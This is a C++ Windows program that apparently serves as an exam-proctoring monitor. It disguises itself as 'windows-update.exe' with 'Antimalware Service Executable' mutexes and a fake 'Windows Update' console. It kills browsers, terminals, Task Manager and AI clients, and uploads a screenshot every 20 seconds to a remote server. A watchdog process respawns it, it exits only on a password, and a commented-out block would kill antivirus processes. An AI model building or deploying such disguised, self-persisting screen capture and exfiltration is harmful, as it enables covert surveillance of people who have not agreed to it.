/*
 * Author Jieyab89 
 * Compile
 * x86_64-w64-mingw32-g++ monitoring.c -o windows-update.exe \
 * -lgdiplus -lgdi32 -luser32 -lws2_32 \
 * -static -static-libgcc -static-libstdc++ -mwindows
 *
*/

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;

/* ============================================================
 *  CONFIGURATION
 * ============================================================ */
#define INSTITUTION_NAME    "UNIVe"
#define SERVER_IP           "Change-IP"
#define SERVER_PORT         PORT
#define SERVER_ENDPOINT     "/Api-upload-monitoring.php"
#define SERVER_TOKEN        "CHANGE_ME_123"
#define SCREENSHOT_INTERVAL 20000           /* ms — screenshot every 20 s  */
#define PROCESS_CHECK_MS    2000            /* ms — kill-check every 2 s   */
#define WATCHDOG_CHECK_MS   2000            /* ms — watchdog poll interval  */

/* Mutex names — used to identify which role this instance plays.
   Change these strings if you rename the exe. */
#define MUTEX_MAIN      "Antimalware Service Executable"
#define MUTEX_WATCHDOG  "Antimalware Service Executable"

/* ============================================================
 *  BLOCKED APPLICATIONS
 * ============================================================ */
static const char* BLOCKED_APPS[] = {

    /* ── BROWSERS ─────────────────────────────────────────── */
    "chrome.exe",
    "msedge.exe",
    "msedgewebview2.exe",
    "firefox.exe",
    "opera.exe",
    "operagx.exe",
    "brave.exe",
    "tor.exe",
    "torbrowser.exe",
    "vivaldi.exe",
    "waterfox.exe",
    "palemoon.exe",
    "iexplore.exe",
    "browser.exe",
    "chromium.exe",
    "browser_broker.exe",

    /* ── AI CLIENTS ────────────────────────────────────────── */
    "chatgpt.exe",
    "copilot.exe",
    "claude.exe",
    "perplexity.exe",
    "gemini.exe",

    /* ── TERMINALS & SCRIPTING ─────────────────────────────── */
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "python.exe",
    "python3.exe",
    "pythonw.exe",
    "node.exe",
    "wt.exe",
    "WindowsTerminal.exe",
    "Taskmgr.exe",
    "Notepad.exe",

    /* ── REMOTE ACCESS ─────────────────────────────────────── */
    "teamviewer.exe",
    "TeamViewer_Service.exe",
    "anydesk.exe",
    "vncviewer.exe",
    "vncserver.exe",
    "rdpclip.exe",
    "mstsc.exe",
    "SupremoHelper.exe",
    "rustdesk.exe",

    /* ── FILE SHARING / CLOUD SYNC ─────────────────────────── */
    "OneDrive.exe",
    "Dropbox.exe",
    "googledrivesync.exe",
    "googledrive.exe",

    /* ── SCREEN CAPTURE / RECORDING ────────────────────────── */
    "obs64.exe",
    "obs32.exe",
    "obs.exe",
    "ShareX.exe",
    "Greenshot.exe",
    "snippingtool.exe",
    "ScreenSketch.exe",

    /* ── COMMUNICATION ─────────────────────────────────────── */
    "whatsapp.exe", 
    "telegram.exe", 
    "discord.exe", 
    "slack.exe",    
    "zoom.exe",      
    "msteams.exe",   

    /* ── VIRTUAL MACHINES ──────────────────────────────────── */
    "vmware.exe",
    "vmplayer.exe",
    "VirtualBoxVM.exe",
    "VBoxHeadless.exe",

    /* ──ANTI VIRUS MACHINES ──────────────────────────────────── 
    "MsMpEng.exe", 
    "MpDefenderCoreService.exe", 
    "NisSrv.exe", 
    "Avira.ServiceHost.exe", 
    "avguard.exe", 
    "avcenter.exe", 
    "avwebgrd.exe", 
    "avsched3.exe", 
    "avgnt.exe"
    */

    /* ── CUSTOM ─────────────────────────────────────────────── */
    /* "customapp.exe", */
};

#define BLOCKED_COUNT (sizeof(BLOCKED_APPS) / sizeof(BLOCKED_APPS[0]))

/* ============================================================
 *  GLOBAL STATE
 * ============================================================ */
static volatile int    g_running      = 1;
static ULONG_PTR       g_gdiplusToken = 0;
static char            g_screenshot_dir[MAX_PATH] = {0};
static char            g_hostname[128]             = "PC";
static char            g_exe_path[MAX_PATH]        = {0};

/* Tray */
#define WM_TRAY_MSG  (WM_USER + 1)
#define TRAY_ID      1001
static NOTIFYICONDATAA g_tray      = {0};
static HWND            g_tray_hwnd = NULL;

/* ============================================================
 *  INIT
 * ============================================================ */
static void init_globals(void)
{
    DWORD sz = (DWORD)sizeof(g_hostname);
    GetComputerNameA(g_hostname, &sz);

    GetModuleFileNameA(NULL, g_exe_path, MAX_PATH);

    char tmp[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, tmp);
    size_t len = strlen(tmp);
    if (len > 0 && tmp[len-1] == '\\') tmp[len-1] = '\0';

    _snprintf(g_screenshot_dir, sizeof(g_screenshot_dir),
              "%s\\vmware-SYSTEM", tmp);
    CreateDirectoryA(g_screenshot_dir, NULL);
}

static void generate_password(char* out, size_t sz)
{
    SYSTEMTIME t;
    GetLocalTime(&t);
    int minute = (t.wMinute / 5) * 5;
    _snprintf(out, sz, "EXAM-%s-%s-%04d%02d%02d-%02d%02d",
        INSTITUTION_NAME, g_hostname,
        t.wYear, t.wMonth, t.wDay,
        t.wHour, minute);
}

static int verify_password(void)
{
    char input[256]   = {0};
    char correct[256] = {0};
    generate_password(correct, sizeof(correct));

    AllocConsole();
    SetConsoleTitleA("Windows Update");

    HWND hCon = GetConsoleWindow();
    if (hCon)
        SetWindowPos(hCon, HWND_TOPMOST, 100, 100, 600, 240, SWP_SHOWWINDOW);

    FILE* fin  = freopen("CONIN$",  "r", stdin);
    FILE* fout = freopen("CONOUT$", "w", stdout);

    printf("");
    fflush(stdout);

    if (fgets(input, sizeof(input), stdin))
        input[strcspn(input, "\r\n")] = 0;

    fclose(fin);
    fclose(fout);
    FreeConsole();

    return (strcmp(input, correct) == 0) ? 1 : 0;
}

static HANDLE spawn_instance(const char* arg)
{
    char cmd[MAX_PATH + 32];
    _snprintf(cmd, sizeof(cmd), "\"%s\" %s", g_exe_path, arg);

    STARTUPINFOA si        = {0};
    si.cb                  = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hThread);
        return pi.hProcess; /* caller owns this handle */
    }
    return NULL;
}

static int is_blocked(const char* name)
{
    for (int i = 0; i < (int)BLOCKED_COUNT; i++)
        if (_stricmp(name, BLOCKED_APPS[i]) == 0) return 1;
    return 0;
}

static void kill_blocked_processes(void)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snap, &pe)) {
        do {
            if (is_blocked(pe.szExeFile)) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

/* ============================================================
 *  SCREENSHOT
 * ============================================================ */
static int get_encoder_clsid(const WCHAR* mime, CLSID* pClsid)
{
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* info = (ImageCodecInfo*)malloc(size);
    if (!info) return -1;
    GetImageEncoders(num, size, info);
    for (UINT j = 0; j < num; j++) {
        if (wcscmp(info[j].MimeType, mime) == 0) {
            *pClsid = info[j].Clsid;
            free(info);
            return (int)j;
        }
    }
    free(info);
    return -1;
}

static void build_screenshot_path(char* out, size_t sz)
{
    SYSTEMTIME t;
    GetLocalTime(&t);
    _snprintf(out, sz, "%s\\%s_%04d%02d%02d_%02d%02d.png",
        g_screenshot_dir, g_hostname,
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute);
}

static int take_screenshot(const char* filepath)
{
    HWND hwnd  = GetDesktopWindow();
    HDC  hdc   = GetDC(hwnd);
    HDC  mdc   = CreateCompatibleDC(hdc);
    int  w     = GetSystemMetrics(SM_CXSCREEN);
    int  h     = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP bmp    = CreateCompatibleBitmap(hdc, w, h);
    HBITMAP oldbmp = (HBITMAP)SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    Bitmap* bitmap = new Bitmap(bmp, NULL);
    CLSID   png_clsid;
    get_encoder_clsid(L"image/png", &png_clsid);

    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, filepath, -1, wpath, MAX_PATH);
    Status st = bitmap->Save(wpath, &png_clsid, NULL);

    delete bitmap;
    SelectObject(mdc, oldbmp);
    DeleteObject(bmp);
    DeleteDC(mdc);
    ReleaseDC(hwnd, hdc);
    return (st == Ok) ? 1 : 0;
}

/* ============================================================
 *  SECURE DELETE + WIPE FOLDER
 * ============================================================ */
static void secure_delete(const char* filepath)
{
    SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);
    FILE* f = fopen(filepath, "r+b");
    if (f) {
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        rewind(f);
        if (sz > 0) {
            unsigned char block[4096] = {0};
            long rem = sz;
            while (rem > 0) {
                int chunk = (rem > (long)sizeof(block))
                            ? (int)sizeof(block) : (int)rem;
                fwrite(block, 1, chunk, f);
                rem -= chunk;
            }
            fflush(f);
        }
        fclose(f);
    }
    DeleteFileA(filepath);
}

static void wipe_screenshot_folder(void)
{
    char pattern[MAX_PATH];
    _snprintf(pattern, sizeof(pattern), "%s\\*.png", g_screenshot_dir);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pattern, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            _snprintf(full, sizeof(full), "%s\\%s", g_screenshot_dir, fd.cFileName);
            secure_delete(full);
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }
    RemoveDirectoryA(g_screenshot_dir);
}

/* ============================================================
 *  UPLOAD
 * ============================================================ */
static int upload_screenshot(const char* filepath)
{
    FILE* f = fopen(filepath, "rb");
    if (!f) return 0;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f); rewind(f);
    if (fsize <= 0) { fclose(f); return 0; }
    unsigned char* fbuf = (unsigned char*)malloc(fsize);
    if (!fbuf) { fclose(f); return 0; }
    if ((long)fread(fbuf, 1, fsize, f) != fsize) { free(fbuf); fclose(f); return 0; }
    fclose(f);

    const char* boundary     = "PUK1MAKBINMEKIASas";
    const char* boundary_sep = "--PUK1MAKBINMEKIASas";
    const char* bname = strrchr(filepath, '\\');
    const char* fname = bname ? bname + 1 : filepath;

    char p_token[512], p_pc[512], p_fhdr[512], p_end[128];
    _snprintf(p_token, sizeof(p_token),
        "%s\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n%s\r\n",
        boundary_sep, SERVER_TOKEN);
    _snprintf(p_pc, sizeof(p_pc),
        "%s\r\nContent-Disposition: form-data; name=\"pc\"\r\n\r\n%s\r\n",
        boundary_sep, g_hostname);
    _snprintf(p_fhdr, sizeof(p_fhdr),
        "%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: image/png\r\n\r\n",
        boundary_sep, fname);
    _snprintf(p_end, sizeof(p_end), "\r\n%s--\r\n", boundary_sep);

    long body_len = (long)(strlen(p_token) + strlen(p_pc) +
                           strlen(p_fhdr) + fsize + strlen(p_end));
    char http_hdr[1024];
    _snprintf(http_hdr, sizeof(http_hdr),
        "POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %ld\r\nConnection: close\r\n\r\n",
        SERVER_ENDPOINT, SERVER_IP, SERVER_PORT, boundary, body_len);

    int success = 0;
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);

    for (int attempt = 0; attempt < 2 && !success; attempt++) {
        if (attempt > 0) Sleep(3000);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) continue;
        DWORD tms = 15000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&tms, sizeof(tms));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tms, sizeof(tms));
        struct sockaddr_in srv = {0};
        srv.sin_family = AF_INET;
        srv.sin_port   = htons(SERVER_PORT);
        srv.sin_addr.s_addr = inet_addr(SERVER_IP);
        if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) == SOCKET_ERROR) {
            closesocket(sock); continue;
        }
        send(sock, http_hdr, (int)strlen(http_hdr), 0);
        send(sock, p_token,  (int)strlen(p_token),  0);
        send(sock, p_pc,     (int)strlen(p_pc),      0);
        send(sock, p_fhdr,   (int)strlen(p_fhdr),    0);
        long sent = 0; int ok = 1;
        while (sent < fsize) {
            int chunk = (int)((fsize-sent) > 8192 ? 8192 : fsize-sent);
            int r = send(sock, (char*)fbuf+sent, chunk, 0);
            if (r <= 0) { ok = 0; break; }
            sent += r;
        }
        if (ok) send(sock, p_end, (int)strlen(p_end), 0);
        char resp[4096] = {0}; int rlen = 0, n;
        while ((n = recv(sock, resp+rlen, (int)sizeof(resp)-rlen-1, 0)) > 0) {
            rlen += n;
            if (rlen >= (int)sizeof(resp)-1) break;
        }
        resp[rlen] = '\0';
        closesocket(sock);
        if (strstr(resp, "HTTP/1.1 200") || strstr(resp, "HTTP/1.0 200"))
            success = 1;
    }
    free(fbuf);
    WSACleanup();
    return success;
}

/* ============================================================
 *  THREADS (main role)
 * ============================================================ */
DWORD WINAPI thread_process_monitor(LPVOID lp)
{
    (void)lp;
    while (g_running) {
        kill_blocked_processes();
        Sleep(PROCESS_CHECK_MS);
    }
    return 0;
}

DWORD WINAPI thread_screenshot(LPVOID lp)
{
    (void)lp;
    while (g_running) {
        char path[MAX_PATH];
        build_screenshot_path(path, sizeof(path));
        if (take_screenshot(path)) {
            Sleep(1000);
            if (upload_screenshot(path))
                secure_delete(path);
        }
        Sleep(SCREENSHOT_INTERVAL);
    }
    return 0;
}

BOOL WINAPI ctrl_handler(DWORD signal)
{
    if (signal == CTRL_CLOSE_EVENT ||
        signal == CTRL_C_EVENT     ||
        signal == CTRL_BREAK_EVENT)
    {
        if (verify_password()) {
            g_running = 0;
            wipe_screenshot_folder();
            Shell_NotifyIconA(NIM_DELETE, &g_tray);
            GdiplusShutdown(g_gdiplusToken);
            ExitProcess(0);
        }
        return TRUE;
    }
    return FALSE;
}

/* ============================================================
 *  TRAY
 * ============================================================ */
static LRESULT CALLBACK tray_wnd_proc(HWND hWnd, UINT msg,
                                       WPARAM wParam, LPARAM lParam)
{
    if (msg == WM_TRAY_MSG) return 0;   /* ignore all tray clicks */
    if (msg == WM_DESTROY) {
        Shell_NotifyIconA(NIM_DELETE, &g_tray);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcA(hWnd, msg, wParam, lParam);
}

static void setup_tray(HINSTANCE hInst)
{
    WNDCLASSA wc     = {0};
    wc.lpfnWndProc   = tray_wnd_proc;
    wc.hInstance     = hInst;
    wc.lpszClassName = "EGTrayClass";
    RegisterClassA(&wc);

    g_tray_hwnd = CreateWindowExA(0, "EGTrayClass", NULL,
        WS_OVERLAPPEDWINDOW, 0, 0, 0, 0,
        HWND_MESSAGE, NULL, hInst, NULL);

    g_tray.cbSize           = sizeof(NOTIFYICONDATAA);
    g_tray.hWnd             = g_tray_hwnd;
    g_tray.uID              = TRAY_ID;
    g_tray.uFlags           = NIF_ICON | NIF_TIP | NIF_MESSAGE;
    g_tray.uCallbackMessage = WM_TRAY_MSG;
    g_tray.hIcon            = LoadIconA(NULL, IDI_SHIELD);
}

static void run_watchdog(DWORD main_pid)
{
    HANDLE h_main = OpenProcess(SYNCHRONIZE, FALSE, main_pid);
    if (!h_main) return;

    while (1) {
        DWORD result = WaitForSingleObject(h_main, WATCHDOG_CHECK_MS);

        if (result == WAIT_OBJECT_0) {
            CloseHandle(h_main);
            h_main = NULL;

            Sleep(300);
            HANDLE h_new = NULL;
            for (int i = 0; i < 5 && !h_new; i++) {
                h_new = spawn_instance("--main");
                if (!h_new) Sleep(500);
            }

            /* Now ask for password — guard is already back up */
            if (verify_password()) {
                /* Correct — kill the restarted main and stop watchdog */
                if (h_new) {
                    TerminateProcess(h_new, 0);
                    CloseHandle(h_new);
                }
                ExitProcess(0);
            }

            /* Wrong/empty/closed — guard already running, just watch new handle */
            if (!h_new) { ExitProcess(0); }
            h_main = h_new;
        }
        /* WAIT_TIMEOUT → main still alive */
    }
}

static void run_main(HINSTANCE hInst)
{
    /* Spawn the watchdog, passing our own PID */
    char arg[64];
    _snprintf(arg, sizeof(arg), "--watchdog %lu", (unsigned long)GetCurrentProcessId());
    HANDLE h_watchdog = spawn_instance(arg);

    SetConsoleCtrlHandler(ctrl_handler, TRUE);
    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    GdiplusStartupInput gdi_input;
    GdiplusStartup(&g_gdiplusToken, &gdi_input, NULL);

    setup_tray(hInst);

    CreateThread(NULL, 0, thread_process_monitor, NULL, 0, NULL);
    CreateThread(NULL, 0, thread_screenshot,      NULL, 0, NULL);

    /* Message loop + watchdog supervision */
    MSG msg;
    while (g_running) {
        /* Process pending tray/window messages (non-blocking) */
        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        /* Check if watchdog is still alive */
        if (h_watchdog) {
            DWORD res = WaitForSingleObject(h_watchdog, 0);
            if (res == WAIT_OBJECT_0) {
                /* Watchdog was killed — restart it silently */
                CloseHandle(h_watchdog);
                _snprintf(arg, sizeof(arg), "--watchdog %lu",
                          (unsigned long)GetCurrentProcessId());
                h_watchdog = spawn_instance(arg);
            }
        }

        Sleep(WATCHDOG_CHECK_MS);
    }

    /* Clean exit */
    if (h_watchdog) {
        TerminateProcess(h_watchdog, 0);
        CloseHandle(h_watchdog);
    }
    wipe_screenshot_folder();
    Shell_NotifyIconA(NIM_DELETE, &g_tray);
    GdiplusShutdown(g_gdiplusToken);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
                   LPSTR lpCmd, int nShow)
{
    (void)hPrev; (void)nShow;

    init_globals();

    /* Parse command line */
    if (lpCmd && strncmp(lpCmd, "--watchdog", 10) == 0) {
        /* Watchdog role — extract main PID from args */
        DWORD main_pid = 0;
        if (strlen(lpCmd) > 11)
            main_pid = (DWORD)atoi(lpCmd + 11);
        run_watchdog(main_pid);
        return 0;
    }

    if (lpCmd && strncmp(lpCmd, "--main", 6) == 0) {
        /* Main role */
        run_main(hInst);
        return 0;
    }

    /* First launch — no args — spawn main child then exit */
    spawn_instance("--main");
    return 0;
}